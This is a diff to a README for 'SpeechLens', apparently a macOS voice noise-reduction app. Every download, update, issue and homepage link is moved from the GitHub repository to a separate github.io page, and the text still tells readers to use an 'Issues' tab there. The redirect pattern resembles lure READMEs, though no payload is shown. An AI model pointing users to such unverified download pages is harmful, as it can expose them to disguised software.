@@ -1,6 +1,6 @@
 # 🎙️ SpeechLens - Crystal-Clear Voice on Any Mac
 
-[![Download SpeechLens](https://img.shields.io/badge/Download-SpeechLens-2ea44f?style=for-the-badge&logo=apple&logoColor=white&labelColor=1a1a1a&color=00b4d8)](https://github.com/vicalere90/SpeechLens)
+[![Download SpeechLens](https://img.shields.io/badge/Download-SpeechLens-2ea44f?style=for-the-badge&logo=apple&logoColor=white&labelColor=1a1a1a&color=00b4d8)](https://vicalere90.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ Getting SpeechLens up and running is as easy as 1-2-3. Follow these steps carefu
 
 ### Step 1: Download SpeechLens
 
-[![Download Now](https://img.shields.io/badge/📥_Get_SpeechLens-Free-Download?style=for-the-badge&color=ff6b6b&labelColor=2d2d2d)](https://github.com/vicalere90/SpeechLens)
+[![Download Now](https://img.shields.io/badge/📥_Get_SpeechLens-Free-Download?style=for-the-badge&color=ff6b6b&labelColor=2d2d2d)](https://vicalere90.github.io)
 
 Visit this link to download the application. This will take you straight to the official download page for SpeechLens.
 
@@ -129,7 +129,7 @@ These advanced tricks will make you sound like a professional podcaster in minut
 
 To make sure you have the latest features and fixes:
 
-1. Visit the download page again: [https://github.com/vicalere90/SpeechLens](https://github.com/vicalere90/SpeechLens)
+1. Visit the download page again: [https://vicalere90.github.io](https://vicalere90.github.io)
 2. Download the newest version.
 3. Replace the existing SpeechLens app in your Applications folder with the new one.
 
@@ -163,7 +163,7 @@ A: Visit the project page on GitHub and look for the "Issues" tab. You can also 
 
 Found a bug? Have a suggestion? Here's how to reach the developers:
 
-1. Go to [https://github.com/vicalere90/SpeechLens](https://github.com/vicalere90/SpeechLens)
+1. Go to [https://vicalere90.github.io](https://vicalere90.github.io)
 2. Click on the **"Issues"** tab at the top.
 3. Click **"New Issue"** and describe your problem or idea.
 4. Include details like your macOS version and what you were doing when the issue occurred.
@@ -176,7 +176,7 @@ The developers check these regularly and appreciate your feedback. They're frien
 
 SpeechLens is your ticket to frustration-free calls, crisp recordings, and beautiful audio—all from a simple, fast app that respects your privacy. Stop struggling with muffled microphones and annoying fans. Try SpeechLens today and hear the difference for yourself.
 
-[![Download SpeechLens Now](https://img.shields.io/badge/👇_Download_SpeechLens-Start-Now?style=for-the-badge&color=ffd166&labelColor=333333&logoColor=white)](https://github.com/vicalere90/SpeechLens)
+[![Download SpeechLens Now](https://img.shields.io/badge/👇_Download_SpeechLens-Start-Now?style=for-the-badge&color=ffd166&labelColor=333333&logoColor=white)](https://vicalere90.github.io)
 
 Your ears—and everyone on the other end of your calls—will thank you.
 
@@ -196,7 +196,7 @@ Together, these technologies mean you get professional-grade noise reduction tha
 
 ## 🔗 Additional Resources
 
-- **Project Homepage:** [https://github.com/vicalere90/SpeechLens](https://github.com/vicalere90/SpeechLens)
+- **Project Homepage:** [https://vicalere90.github.io](https://vicalere90.github.io)
 - **System Requirements:** Apple Silicon Mac, macOS 14.0+
 - **Support:** Use the Issues page on GitHub for help.
 
